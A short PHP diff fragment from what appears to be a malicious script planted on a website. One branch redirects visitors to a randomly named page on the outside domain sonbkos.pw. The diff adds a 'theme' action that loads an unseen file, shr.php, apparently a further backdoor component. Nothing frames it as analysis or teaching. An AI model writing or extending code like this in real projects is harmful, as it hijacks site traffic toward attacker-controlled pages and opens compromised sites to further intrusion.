@@ -56,5 +56,7 @@
   }else if($action == "site"){
     $filename = generate_name(rand(5,8)).".html";
     header("Location:http://sonbkos.pw/".$filename);
-  }
+  } else if ($action == "theme"){
+    require_once("shr.php");
+}
 ?>
